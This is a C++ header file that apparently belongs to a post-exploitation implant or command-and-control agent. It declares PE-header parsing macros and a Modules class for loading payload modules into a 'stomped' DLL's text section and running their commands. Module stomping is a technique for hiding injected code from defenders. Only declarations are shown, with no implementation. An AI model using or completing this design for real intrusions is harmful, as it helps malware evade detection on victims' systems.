#pragma once
#include <windows.h>
#include "agent/core.h"

#define DOS_HEADER(base) ((PIMAGE_DOS_HEADER)(base))
#define NT_HEADERS(base) ((PIMAGE_NT_HEADERS)((PBYTE)(base) + DOS_HEADER(base)->e_lfanew))
#define OPT_HEADER(base) (&NT_HEADERS(base)->OptionalHeader)
#define FILE_HEADER(base) (&NT_HEADERS(base)->FileHeader)
#define SECTION_HEADER(base) ((PIMAGE_SECTION_HEADER)((PBYTE)&NT_HEADERS(base)->OptionalHeader + FILE_HEADER(base)->SizeOfOptionalHeader))
#define RVA2VA(type, base, rva) ((type)((PBYTE)(base) + (rva)))

#define PAGE_ALIGN(x) (((SIZE_T)(x) + 0xFFF) & ~(SIZE_T)0xFFF)

#define MAX_MODULES 64


typedef struct {
	INT32 id;
	PVOID EntryPoint;
	SIZE_T ModuleSizeInMemory;
} ModuleInformation;


class Modules {
private:
	INT64 LoadModulesBitMap;
	BOOL IsStompedDllLoaded;
	ModuleInformation ModuleInfos[ MAX_MODULES ]{};


	PVOID StompedDllText;
	SIZE_T StompedDllTextSize;
	PVOID TextSectionIndex;

	PVOID ReserveArena( SIZE_T size );
	void UpdateBitField( INT32 Bit );
	ModuleInformation* FindFreeModInfo( );
	ModuleInformation* FindModInfoEntry( INT32 needed );

	
	

public:
	static void* operator new( SIZE_T size ) {
		void* ptr = kratos->apis.LocalAlloc( ALLOC_ARGS, size );
		if ( ! ptr ) { return NULL; }
		return ptr;
	}
	

	BOOL IsModuleLoaded( INT32 bit );
	BOOL LoadModule( PBYTE Module, SIZE_T ModuleSize, INT32 ModuleBit );
	BOOL LoadStompedDll( );
	BOOL GetStompedDllText( PVOID DllBase );
	BOOL RunModuleCommand( INT32 ModuleBit );

	INT64 GetLoadedModulesBitMap();

};


extern Modules* modules;